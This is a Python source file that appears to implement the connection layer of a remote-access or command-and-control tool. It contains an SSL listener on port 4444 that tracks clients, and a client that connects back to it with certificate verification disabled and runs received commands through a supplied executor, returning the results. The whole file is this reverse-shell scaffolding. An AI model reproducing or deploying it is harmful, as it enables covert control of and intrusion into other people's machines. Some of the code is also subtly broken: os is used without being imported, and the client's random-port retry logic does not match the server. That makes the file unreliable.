import socket
import ssl
import time
import random
import subprocess

def start_server(host='0.0.0.0', base_port=4444, clients=None):
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile="server.crt", keyfile="server.key")
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    port = base_port
    while True:
        try:
            server_socket.bind((host, port))
            break
        except:
            port = random.randint(1024, 65535)
    server_socket.listen(5)
    ssl_socket = context.wrap_socket(server_socket, server_side=True)
    print(f"[*] Server listening on {host}:{port} (SSL)")
    return ssl_socket, port

def handle_client(client_socket, client_id, clients):
    try:
        while True:
            data = client_socket.recv(16384).decode()
            if not data:
                break
            cmd, response_id = data.split(":", 1) if ":" in data else (data, "")
            response = execute_server_command(cmd, client_id, clients)
            client_socket.send(f"{response_id}:{response}".encode())
    except Exception as e:
        print(f"[!] Error with {client_id}: {e}")
    finally:
        client_socket.close()
        clients.pop(client_id, None)
        print(f"[*] Disconnected: {client_id}")

def execute_server_command(cmd, client_id, clients):
    if cmd == "ping":
        return f"[*] Pong from server to {client_id}"
    elif cmd == "list_clients":
        return "\n".join(clients.keys())
    else:
        return "[!] Unknown server command"

def start_client(server_ip, base_port=4444):
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    port = base_port
    retry_count = 0
    max_retries = 5
    while retry_count < max_retries:
        try:
            ssl_socket = context.wrap_socket(client_socket, server_hostname=server_ip)
            ssl_socket.connect((server_ip, port))
            print(f"[*] Connected to {server_ip}:{port} (SSL)")
            return ssl_socket
        except:
            retry_count += 1
            print(f"[!] Connection failed, retry {retry_count}/{max_retries}")
            port = random.randint(1024, 65535)
            time.sleep(2 ** retry_count)
    raise Exception("Max retries reached")

def client_loop(client_socket, execute_command):
    while True:
        try:
            cmd = client_socket.recv(16384).decode()
            if not cmd:
                break
            response_id, command = cmd.split(":", 1) if ":" in cmd else ("", cmd)
            if command == "exit":
                break
            response = execute_command(command)
            client_socket.send(f"{response_id}:{response}".encode())
        except Exception as e:
            client_socket.send(f"{response_id}:[!] Error: {e}".encode())
            break
    client_socket.close()

def generate_ssl_certificates():
    if not os.path.exists("server.crt") or not os.path.exists("server.key"):
        subprocess.run("openssl req -x509 -newkey rsa:2048 -keyout server.key -out server.crt -days 365 -nodes -subj '/CN=localhost'", shell=True)